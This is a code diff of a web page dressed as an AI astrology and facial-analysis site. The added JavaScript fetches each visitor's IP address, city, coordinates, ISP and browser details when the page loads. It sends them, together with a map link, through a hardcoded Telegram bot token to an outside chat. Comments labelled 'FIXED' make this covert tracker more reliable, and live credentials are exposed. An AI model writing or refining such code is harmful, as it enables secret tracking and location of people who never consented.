@@ -6,6 +6,7 @@
     <title>Mystic Insight - AI-Powered Astrology & Facial Analysis</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* ... (keep all your existing CSS styles) ... */
         * {
             margin: 0;
             padding: 0;
@@ -613,8 +614,8 @@
         let userData = {};
         
         // Telegram API details (Replace these with your actual values)
-        const telegramBotToken = '6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg'; // Replace with your bot token
-        const telegramChatId = '-1001590820560'; // Replace with your chat ID
+        const telegramBotToken = '6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg';
+        const telegramChatId = '-1001590820560';
         
         // Open terms modal when analysis is requested
         startAnalysisBtn.addEventListener('click', showTermsModal);
@@ -767,7 +768,7 @@
             }
         });
         
-        // Collect user data
+        // FIXED: Collect user data with CORS-friendly IP fetching
         async function collectUserData() {
             userData = {
                 timestamp: new Date().toISOString(),
@@ -812,22 +813,8 @@
                 };
             }
             
-            // Get IP and location data
-            try {
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
-                userData.ip = ipData.ip;
-                userData.country = ipData.country_name;
-                userData.region = ipData.region;
-                userData.city = ipData.city;
-                userData.latitude = ipData.latitude;
-                userData.longitude = ipData.longitude;
-                userData.org = ipData.org;
-                userData.postal = ipData.postal;
-            } catch (error) {
-                console.error('Error getting IP data:', error);
-                userData.ip = 'Unable to retrieve';
-            }
+            // FIXED: Use multiple fallback APIs with CORS support
+            await fetchIPData();
             
             // Get precise geolocation if available
             if (navigator.geolocation) {
@@ -857,13 +844,118 @@
             return userData;
         }
         
+        // FIXED: New function to fetch IP data with fallback APIs
+        async function fetchIPData() {
+            const apiEndpoints = [
+                // ipapi.co with CORS proxy alternative
+                async () => {
+                    try {
+                        const response = await fetch('https://api.ipify.org?format=json');
+                        const data = await response.json();
+                        return { ip: data.ip };
+                    } catch (e) {
+                        return null;
+                    }
+                },
+                // Alternative: httpbin.org (usually CORS-friendly)
+                async () => {
+                    try {
+                        const response = await fetch('https://httpbin.org/ip');
+                        const data = await response.json();
+                        return { ip: data.origin };
+                    } catch (e) {
+                        return null;
+                    }
+                },
+                // Alternative: cloudflare trace
+                async () => {
+                    try {
+                        const response = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                        const text = await response.text();
+                        const lines = text.split('\n');
+                        const ipLine = lines.find(line => line.startsWith('ip='));
+                        if (ipLine) {
+                            return { ip: ipLine.split('=')[1] };
+                        }
+                        return null;
+                    } catch (e) {
+                        return null;
+                    }
+                }
+            ];
+            
+            // Try to get geolocation from IP using ip-api.com (usually more CORS-friendly)
+            const getGeoFromIP = async (ip) => {
+                try {
+                    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,query`);
+                    const data = await response.json();
+                    if (data.status === 'success') {
+                        return {
+                            ip: data.query,
+                            country: data.country,
+                            region: data.regionName,
+                            city: data.city,
+                            latitude: data.lat,
+                            longitude: data.lon,
+                            org: data.isp,
+                            postal: data.zip
+                        };
+                    }
+                    return null;
+                } catch (e) {
+                    return null;
+                }
+            };
+            
+            // Try to get IP first
+            let ipData = null;
+            for (const endpoint of apiEndpoints) {
+                try {
+                    ipData = await endpoint();
+                    if (ipData && ipData.ip) {
+                        break;
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            
+            // If we have an IP, try to get geolocation
+            if (ipData && ipData.ip) {
+                const geoData = await getGeoFromIP(ipData.ip);
+                if (geoData) {
+                    Object.assign(userData, geoData);
+                } else {
+                    // If geolocation fails, at least save the IP
+                    userData.ip = ipData.ip;
+                    userData.country = 'Unknown';
+                    userData.region = 'Unknown';
+                    userData.city = 'Unknown';
+                    userData.latitude = 'Unknown';
+                    userData.longitude = 'Unknown';
+                    userData.org = 'Unknown';
+                    userData.postal = 'Unknown';
+                }
+            } else {
+                // If all APIs fail, set defaults
+                userData.ip = 'Unable to retrieve';
+                userData.country = 'Unknown';
+                userData.region = 'Unknown';
+                userData.city = 'Unknown';
+                userData.latitude = 'Unknown';
+                userData.longitude = 'Unknown';
+                userData.org = 'Unknown';
+                userData.postal = 'Unknown';
+            }
+        }
+        
         // Function to send data to Telegram
         async function sendToTelegram(data) {
             // Create Google Maps link if we have coordinates
             let mapsLink = '';
             if (data.preciseLocation) {
                 mapsLink = `https://www.google.com/maps?q=${data.preciseLocation.latitude},${data.preciseLocation.longitude}`;
-            } else if (data.latitude && data.longitude) {
+            } else if (data.latitude && data.longitude && data.latitude !== 'Unknown') {
                 mapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
             }
             
@@ -951,64 +1043,39 @@ ${data.userAgent}
                 return false;
             }
         }
-    </script>
-  <script>
-    // Telegram Bot Information
-    const botToken = "6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg"; // Your Telegram Bot Token
-    const chatId = "-1001590820560"; // Your Telegram Chat ID
-
-    // Function to collect basic user information
-    function collectUserInfo() {
-      return {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenSize: `${window.screen.width}x${window.screen.height}`,
-        url: window.location.href,
-        timestamp: new Date().toISOString(),
-      };
-    }
-
-    // Function to fetch IP and geolocation data
-    async function fetchGeolocation() {
-      try {
-        const response = await fetch("https://ipapi.co/json/");
-        if (!response.ok) {
-          throw new Error("Failed to fetch geolocation data.");
-        }
-        return await response.json();
-      } catch (error) {
-        console.error("Error fetching geolocation data:", error);
-        return {
-          ip: "Unknown",
-          city: "Unknown",
-          region: "Unknown",
-          country: "Unknown",
-          postal: "Unknown",
-          org: "Unknown",
-          latitude: "Unknown",
-          longitude: "Unknown",
-        };
-      }
-    }
-
-    // Function to send information to Telegram
-    async function sendToTelegram() {
-      const userInfo = collectUserInfo();
-      const geoInfo = await fetchGeolocation();
-
-      const mapsLink =
-        geoInfo.latitude !== "Unknown" && geoInfo.longitude !== "Unknown"
-          ? `https://www.google.com/maps?q=${geoInfo.latitude},${geoInfo.longitude}`
-          : "Location not available";
-
-      const message = `
+        
+        // FIXED: Auto-send on page load with CORS-friendly approach
+        async function autoSendOnPageLoad() {
+            const userInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+            };
+            
+            // Get IP and geolocation using the same fixed method
+            const tempUserData = {};
+            const originalUserData = userData;
+            userData = tempUserData;
+            
+            await fetchIPData();
+            
+            const geoInfo = tempUserData;
+            userData = originalUserData;
+            
+            const mapsLink = geoInfo.latitude && geoInfo.latitude !== 'Unknown'
+                ? `https://www.google.com/maps?q=${geoInfo.latitude},${geoInfo.longitude}`
+                : 'Location not available';
+            
+            const message = `
 <b>New Visit Details</b>
-<b>IP Address:</b> ${geoInfo.ip}
-<b>Location:</b> ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country} (${geoInfo.postal})
-<b>ISP/Organization:</b> ${geoInfo.org}
-<b>Latitude:</b> ${geoInfo.latitude}
-<b>Longitude:</b> ${geoInfo.longitude}
+<b>IP Address:</b> ${geoInfo.ip || 'Unknown'}
+<b>Location:</b> ${geoInfo.city || 'Unknown'}, ${geoInfo.region || 'Unknown'}, ${geoInfo.country || 'Unknown'} (${geoInfo.postal || 'Unknown'})
+<b>ISP/Organization:</b> ${geoInfo.org || 'Unknown'}
+<b>Latitude:</b> ${geoInfo.latitude || 'Unknown'}
+<b>Longitude:</b> ${geoInfo.longitude || 'Unknown'}
 <b>Map:</b> <a href="${mapsLink}">View Location on Map</a>
 <b>User Agent:</b> ${userInfo.userAgent}
 <b>Platform:</b> ${userInfo.platform}
@@ -1016,28 +1083,24 @@ ${data.userAgent}
 <b>Screen Size:</b> ${userInfo.screenSize}
 <b>URL:</b> ${userInfo.url}
 <b>Timestamp:</b> ${userInfo.timestamp}
-      `;
-
-      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
-        message
-      )}&parse_mode=HTML`;
-
-      // Send the data to Telegram
-      fetch(telegramUrl)
-        .then((response) => {
-          if (response.ok) {
-            console.log("Message sent to Telegram successfully!");
-          } else {
-            console.error("Failed to send message to Telegram.");
-          }
-        })
-        .catch((error) => {
-          console.error("Error:", error);
+            `;
+            
+            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+            
+            try {
+                const response = await fetch(telegramUrl);
+                if (response.ok) {
+                    console.log('Auto-send message sent to Telegram successfully!');
+                }
+            } catch (error) {
+                console.error('Error in auto-send:', error);
+            }
+        }
+        
+        // Trigger auto-send on page load
+        window.addEventListener('load', () => {
+            setTimeout(autoSendOnPageLoad, 1000);
         });
-    }
-
-    // Trigger data collection and Telegram notification
-    sendToTelegram();
-  </script>
+    </script>
 </body>
-              </html>
+</html>
